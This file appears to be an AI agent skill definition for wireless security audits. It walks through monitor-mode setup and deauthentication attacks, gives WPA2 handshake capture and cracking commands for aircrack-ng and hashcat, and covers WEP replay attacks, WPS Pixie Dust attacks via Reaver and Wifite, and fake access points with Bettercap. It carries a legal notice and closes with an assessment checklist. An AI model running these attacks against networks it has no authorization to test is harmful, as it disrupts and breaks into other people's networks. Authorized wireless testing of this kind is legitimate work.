---
name: security/wireless-audit
description: Use when auditing wireless network security. Covers the aircrack-ng suite for WEP/WPA/WPA2 assessment, Wifite for automated testing, Bettercap for network attacks, and wireless security assessment checklists.
version: 1.0.0
author: OWL
license: MIT
metadata:
  hermes:
    tags: [security, wireless, wifi, aircrack, wifite, bettercap, wep, wpa, wpa2]
    related_skills:
      - security/workflow
      - security/password-attack
      - security/tool-setup
---

# Wireless Security Audit

## Overview

This skill covers wireless network security assessment using the aircrack-ng suite, Wifite, and Bettercap. **Wireless testing requires a compatible wireless adapter with monitor mode support** (e.g., Alfa AWUS036ACH, TP-Link TL-WN722N v1).

> ⚠️ **Legal Notice:** Wireless testing requires explicit written authorization for the specific frequencies, locations, and target networks. Unauthorized wireless interception is illegal in most jurisdictions (Wiretap Act, Computer Misuse Act, etc.).

## When to Use

- You have authorization to assess specific wireless networks
- You need to test WPA2-PSK password strength
- You need to identify rogue access points
- You need to assess wireless security posture (WPA2 vs WPA3, Enterprise vs Personal)
- You have a compatible wireless adapter with monitor mode

**Don't use for:** wired network testing (use `security/network-recon`), password attacks on services (use `security/password-attack`).

## Hardware Requirements

### Compatible Adapters (Monitor Mode + Packet Injection)
| Adapter | Chipset | Notes |
|---------|---------|-------|
| Alfa AWUS036ACH | Realtek RTL8812AU | Best all-around, dual-band |
| Alfa AWUS036NHA | Atheros AR9271 | Great for 2.4GHz |
| TP-Link TL-WN722N v1 | Atheros AR9271 | Budget option (v2/v3 NOT compatible) |
| Panda PAU09 | Ralink RT5572 | Dual-band |

### Verify Adapter
```bash
# List USB devices
lsusb

# Check wireless interface
iwconfig
# or
ip link show

# Check monitor mode support
iw list | grep -A 5 "Supported interface modes"
# Should include "monitor"
```

## Tool Availability Check

```bash
aircrack-ng --version
wifite --version 2>&1 | head -1
bettercap --version 2>&1 | head -1
hcxdumptool --version 2>&1 | head -1
```

Install: `sudo apt install aircrack-ng wifite bettercap hcxdumptool`

## Phase 1: Recon & Enumeration

### Monitor Mode Setup
```bash
# Check current mode
iwconfig wlan0

# Kill interfering processes
sudo airmon-ng check kill

# Start monitor mode
sudo airmon-ng start wlan0
# Creates: wlan0mon (or wlan0 stays as monitor)

# Alternative with iw
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Verify monitor mode
iwconfig wlan0
# Should show "Mode:Monitor"

# Restore managed mode after testing
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
```

### Wireless Scanning
```bash
# Scan for all nearby APs
sudo airodump-ng wlan0mon

# Scan specific band
sudo airodump-ng --band a wlan0mon    # 5GHz
sudo airodump-ng --band g wlan0mon    # 2.4GHz
sudo airodump-ng --band abg wlan0mon  # Both

# Scan specific channel
sudo airodump-ng -c 6 wlan0mon       # Channel 6
sudo airodump-ng -c 1,6,11 wlan0mon  # Multiple channels

# Scan and save
sudo airodump-ng -w recon_scan wlan0mon
```

### Interpreting airodump-ng Output
```
BSSID              PWR  Beacons  #Data  CH  MB   ENC  CIPHER AUTH ESSID
AA:BB:CC:DD:EE:FF  -45  12345    6789   6  130  WPA2 CCMP  PSK  TargetWiFi
11:22:33:44:55:66  -67  54321    1234   1  54   WEP  WEP        OpenWiFi

BSSID: AP MAC address
PWR: Signal strength (closer to 0 = stronger)
Beacons: Management frames from AP
#Data: Data frames captured
CH: Channel
MB: Max speed in Mbps
ENC: Encryption (WEP/WPA/WPA2/OPN)
CIPHER: Encryption cipher (CCMP/TKIP/WEP)
AUTH: Authentication (PSK=Personal, MGT=Enterprise, OPN=Open)
```

### Target Identification
```bash
# Focus scan on target AP (replace with actual BSSID and channel)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w target_capture wlan0mon

# Find hidden SSIDs (wait for probe responses)
sudo airodump-ng wlan0mon | grep -i "length: 0"    # Hidden SSIDs show as <length: 0>
# When a client connects, the SSID is revealed in probe responses
```

## Phase 2: WPA2 Handshake Capture

### Method 1: Passive Capture (Wait for Client)
```bash
# Monitor target AP and wait for a client to connect/open authentication
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# Watch for "WPA handshake" message in the top-right corner
# Output saved to wpa_capture-01.cap
```

### Method 2: Deauth Attack (Force Reconnect)
```bash
# Terminal 1: Start capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# Terminal 2: Send deauth to a specific client
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Or broadcast deauth (deauth all clients)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# -0 5 = send 5 deauth frames (0 = continuous, Ctrl+C to stop)
# -a = AP BSSID (target)
# -c = Client MAC (optional, omit for broadcast)
```

### Verify Handshake Capture
```bash
# Check if handshake was captured
aircrack-ng wpa_capture-01.cap
# Look for: "1 handshake" or "WPA (1 handshake)"

# Or use tshark
tshark -r wpa_capture-01.cap -Y "eapol" | head -5
```

### Convert for Hashcat
```bash
# Convert .cap to .hc22000 (Hashcat format)
hcxpcapngtool -o handshake.hc22000 wpa_capture-01.cap

# Or use cap2hccapx (older format)
cap2hccapx wpa_capture-01.cap handshake.hccapx
```

## Phase 3: Cracking

### Aircrack-ng (CPU)
```bash
# Crack WPA2 handshake
aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap

# With specific BSSID
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap

# With rules (using John's wordlist rules)
aircrack-ng -w <(john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 --stdout) wpa_capture-01.cap
```

### Hashcat (GPU)
```bash
# WPA2 in Hashcat mode 22000
hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt

# With rules
hashcat -m 22000 handshake.hc22000 wordlist.txt -r rules/best64.rule

# Mask attack
hashcat -m 22000 handshake.hc22000 -a 3 ?d?d?d?d?d?d?d?d  # 8-digit PIN

# Show cracked
hashcat -m 22000 --show handshake.hc22000
```

## Phase 4: WEP Cracking (Legacy)

```bash
# Capture WEP traffic
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# ARP replay attack (generate traffic)
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# Fragmentation attack
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 wlan0mon

# Crack WEP key
aircrack-ng -b AA:BB:CC:DD:EE:FF wep_capture-01.cap
```

## Phase 5: Wifite (Automated)

```bash
# Automated WPA cracking
sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt

# Target specific BSSID
sudo wifite --bssid AA:BB:CC:DD:EE:FF --dict /usr/share/wordlists/rockyou.txt

# Target specific channel
sudo wifite --channel 6 --wpa --dict /usr/share/wordlists/rockyou.txt

# WEP only
sudo wifite --wep

# WPS attack (Pixie Dust)
sudo wifite --wps --pixie

# No cracking (just scan and capture)
sudo wifite --no-crack

# Cracking time limit
sudo wifite --wpa --dict /usr/share/wordlists/rockyou.txt --crack-time 3600
```

## Phase 6: Bettercap (Network Attacks)

```bash
# Start Bettercap
sudo bettercap -iface wlan0mon

# WiFi module commands (inside bettercap)
wifi.recon on                    # Start WiFi recon
wifi.recon off                   # Stop WiFi recon
wifi.show                        # Show discovered APs and clients

# Deauth attack
wifi.deauth AA:BB:CC:DD:EE:FF    # Deauth all clients on AP
wifi.deauth AA:BB:CC:DD:EE:FF:11:22:33:44:55:66  # Deauth specific client

# Beacon flood (create fake APs)
wifi.ap create "FreeWiFi"        # Create fake AP

# Probe request monitoring
wifi.probe on                    # Monitor probe requests

# WPA handshake capture
wifi.handshake capture AA:BB:CC:DD:EE:FF

# Set channel
wifi.recon.channel 6
wifi.recon.channel 1,6,11
```

## Phase 7: Wireless Security Assessment Checklist

### Access Point Assessment
- [ ] **Encryption:** WPA3 > WPA2-CCMP > WPA2-TKIP > WEP > Open
- [ ] **Authentication:** Enterprise (802.1X) > Personal (PSK)
- [ ] **Hidden SSID:** Not a security measure (easily discovered)
- [ ] **MAC Filtering:** Bypassable (MAC spoofing)
- [ ] **WPS:** Check if enabled (vulnerable to Pixie Dust / brute force)
- [ ] **Default Credentials:** Check router admin panel
- [ ] **Firmware:** Check for known vulnerabilities
- [ ] **Rogue AP:** Check for unauthorized access points
- [ ] **Signal Leakage:** Check if signal extends beyond physical perimeter

### WPS Assessment
```bash
# Check WPS status
sudo wash -i wlan0mon

# Pixie Dust attack (Reaver)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1

# Bully (alternative to Reaver)
sudo bully -b AA:BB:CC:DD:EE:FF -c 6 wlan0mon
```

### Enterprise (802.1X) Assessment
```bash
# Check for EAP types
sudo airodump-ng wlan0mon | grep EAP

# EAP downgrade attack (if using hostapd-mana)
# Requires specific setup with hostapd-mana
```

## Common Pitfalls

1. **Wrong adapter.** Many cheap USB WiFi adapters don't support monitor mode or packet injection. Verify with `iw list` before buying.
2. **Not killing NetworkManager.** `airmon-ng check kill` is essential. NetworkManager fights for control of the interface.
3. **Deauthing without authorization.** Deauth attacks are active disruption. Only use on networks you own or have explicit authorization for.
4. **Not waiting long enough for handshake.** Passive capture can take hours. Deauth forces a reconnect but may be detected.
5. **Wrong channel.** If you're not on the same channel as the AP, you won't capture anything. Set channel explicitly with `-c`.
6. **Forgetting to restore managed mode.** After testing, `airmon-ng stop wlan0mon` and restart NetworkManager.
7. **WPA3 not crackable with current methods.** WPA3-SAE (Dragonfly handshake) is resistant to offline cracking. Report as a positive security finding.

## Verification Checklist

- [ ] Wireless adapter supports monitor mode and packet injection
- [ ] All nearby APs identified and documented
- [ ] Target AP BSSID, channel, encryption, and authentication documented
- [ ] WPA2 handshake captured (verified with aircrack-ng)
- [ ] WPS status checked
- [ ] Password cracking attempted with appropriate wordlists
- [ ] Rogue APs identified
- [ ] Signal leakage assessed
- [ ] All findings documented with evidence
- [ ] Wireless adapter restored to managed mode after testing
